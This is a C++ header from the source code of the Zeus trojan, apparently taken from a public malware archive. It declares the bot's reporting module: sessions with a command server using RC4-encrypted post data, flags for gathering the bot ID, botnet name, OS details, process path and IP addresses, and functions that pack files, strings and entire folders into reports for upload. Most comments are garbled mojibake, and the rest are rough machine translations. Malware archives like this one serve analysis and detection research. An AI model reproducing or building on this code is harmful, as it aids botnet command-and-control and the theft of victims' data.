/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ���� � �������� �������.
*/
#pragma once

#include "..\common\crypt.h"
#include "..\common\binstorage.h"
#include "..\common\threadsgroup.h"

namespace Report
{
  typedef struct _SERVERSESSION
  {
    LPSTR url; //URL of the server.

    /*
      ������� ���������� ��� ������������ �������.

      IN loop    - ����� ������� ��� �������� ����������.
      IN session - ������ ������ �������� � StartServerSession. �� pSession->pPostData - �����
                   ��������� ����� ������������� pSession->pPostData, ������� �� ������ ��������
                   �������� ������ ���� �������, ��� ��������� ����� ���������� ����� �����
                   ���������� �������. ��������� ������� BinStorage::_pack ������.

      Return     - SSPR_*
    */
    typedef int (*REQUESTPROC)(DWORD loop, _SERVERSESSION *session);
    REQUESTPROC requestProc;

    /*
      ������� ���������� ��� ��������� ���������� ������� (������ �������). ���������� ������ �
      ������ ��������� ���������� BinStorage::_unpack ��� ������ �������.

      IN loop    - ����� ������� ��� �������� ����������.
      IN session - ������ ������ �������� � StartServerSession. �� pSession->pPostData - �����
                   ��������� ����� ������� (��� ����������� BinStorage::_unpack). ��������� �����
                   ��������� ����� ����� ������ �� ���� �������.

      Return     - SSPR_*
    */
    typedef int (*RESULTPROC)(DWORD loop, _SERVERSESSION *session);
    RESULTPROC resultProc;

    HANDLE stopEvent; //Signal priryvaniya.

    //Data on the encryption key for pPostData. The key is not to be stagnant during the processing of requests.
    Crypt::RC4KEY *rc4Key;

    BinStorage::STORAGE *postData; //Post data to the mandrel. When you send a _Run can be as NULL,
                                   //So already created. But not after BinStorage:: _pack!

    void *customData; //EXTRA data to external functions.
  }SERVERSESSION;

  //Exit codes for REQUESTPROC.
  enum
  {
    SSPR_CONTUNUE, //Prodlozhit vypolenenie.
    SSPR_END,      //Session is over.
    SSPR_ERROR     //The session ended with an error.
  };

  //The main types of information to be added to the log.
  enum
  {
    BIF_BOT_ID       = 0x01, //Adding BOTID and botnet.
    BIF_BOT_VERSION  = 0x02, //Adding a version of the bot.
    BIF_TIME_INFO    = 0x04, //Adding data about time.
    BIF_OS           = 0x08, //Adding information about the OS.
    BIF_PROCESS_FILE = 0x10, //Way process.
    BIF_IP_ADDRESSES = 0x20  //List of IP-addresses.
  };

  //Flags for writeFolderAsArchive.
  enum
  {
    WFAA_RECURSE = 0x1 //Save subdirectory.
  };

  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ���������� ������� ���������� � �����.

    IN OUT binStorage - �����������(�����). ���� �� ����� *pph == NULL, �� ������� ������� �����
                        ������������
    IN flags          - ����� BIF_*.

    Return            - true - � ������ ������, 
                        false - � ������ ������.
  */
  bool addBasicInfo(BinStorage::STORAGE **binStorage, DWORD flags);

  /*
    ������� �������, �������� ������������� �������� ������� �� ������.

    IN group - ������ �������.

    Return   - true - � ������ ������, 
               false - � ������ ������.
  */
  bool _create(ThreadsGroup::GROUP *group);

  /*
    ������ ������ � ��������.

    IN session - ������. 

    Return     - true - � ������ ��������� ���������� ������ (����������, ������������ �������,
                 �������� SSPR_END �� *_PROC)
                 false - � ����� ������ ������.
  */
  bool startServerSession(SERVERSESSION *session);

  /*
    ������ ������ � ����� (������� ������ ������� ������).

    IN type       - ��� ���� BLT_*.
    IN sourcePath - �������� ���� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN destPath   - ���� ���������� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN data       - ������.
    IN dataSize   - ������ ������.

    Return        - true - � ������ ������, 
                    false - � ������ ������.
  */
  bool writeData(DWORD type, LPWSTR sourcePath, LPWSTR destPath, void *data, DWORD dataSize);

  /*
    ������ IStream ������ � �����.

    IN type       - ��� ���� BLT_*.
    IN sourcePath - �������� ���� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN destPath   - ���� ���������� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN data       - ������.

    Return        - true - � ������ ������, 
                    false - � ������ ������.
  */
  bool writeIStream(DWORD type, LPWSTR sourcePath, LPWSTR destPath, IStream *data);

  /*
    ������ � ��� ������.

    IN type       - ��� ���� BLT_*.
    IN sourcePath - �������� ���� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN destPath   - ���� ���������� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN string     - ������.

    Return        - true - � ������ ������, 
                    false - � ������ ������.
  */
  bool writeString(DWORD type, LPWSTR sourcePath, LPWSTR destPath, LPWSTR string);
    
  /*
    ������ � ��� ������ �� �������.

    IN type       - ��� ���� BLT_*.
    IN sourcePath - �������� ���� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN destPath   - ���� ���������� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN format     - ������ ������.
    IN ...        - ���������.

    Return        - true - � ������ ������, 
                    false - � ������ ������.
  */
  bool writeStringFormat(DWORD type, LPWSTR sourcePath, LPWSTR destPath, LPWSTR format, ...);

  /*
    ������ ����� � �����.

    IN file       - �������� ����.
    IN sourcePath - �������� ����, ���� ������� NULL, �� ����� �������������� file.
    IN destPath   - ���� ���������� ��� NULL.

    Return        - true - � ������ ������, 
                    false - � ������ ������.
  */
  bool writeFile(LPWSTR file, LPWSTR sourcePath, LPWSTR destPath);
  
  /*    Recording folder (with subfolders) in a report in the form of an archive.

    IN path - the source folder.
    IN fileMask - array of file masks.
    IN fileMaskCount - col. elements in fileMask.
    IN destPath - destination path, or NULL.
    IN flags - flags WFAA_ *.

    Return - true - if successful,
                       false - if an error occurs.
  */
  bool writeFolderAsArchive(LPWSTR path, LPWSTR *fileMask, DWORD fileMaskCount, LPWSTR destPath, DWORD flags);
};
